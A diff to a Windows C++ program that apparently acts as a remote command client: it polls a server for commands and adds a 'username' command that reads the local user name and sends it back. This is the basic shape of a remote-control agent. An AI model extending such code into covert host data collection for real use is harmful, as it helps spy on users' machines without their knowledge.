@@ -19,8 +19,8 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrev, PWSTR lpCmdLine, int n
 		{
 			client.connect_to_server();
 		}
-		handle_command(command);
-		Sleep(500);
+		handle_command(client,command);
+		Sleep(100);
 	}
 	return 0;
 }
@@ -32,7 +32,7 @@ int init_winsock()
 	return 0;
 }
 
-void handle_command(string& command)
+void handle_command(CLIENT& client, string& command)
 {
 	if(command.substr(0,5) == "show ")
 	{
@@ -42,4 +42,19 @@ void handle_command(string& command)
 	{
 		ExitProcess(0);
 	}
+	else if(command == "username")
+	{
+		send_username(client);
+	}
+}
+
+void send_username(CLIENT& client) // TODO: Needs some polishing
+{
+	char *uname = new char[500];
+	DWORD user_len = 500;
+	GetUserNameA(uname, &user_len);
+	string resp;
+	resp.assign(uname);
+	client.send_response(resp);
+	delete[] uname;
 }
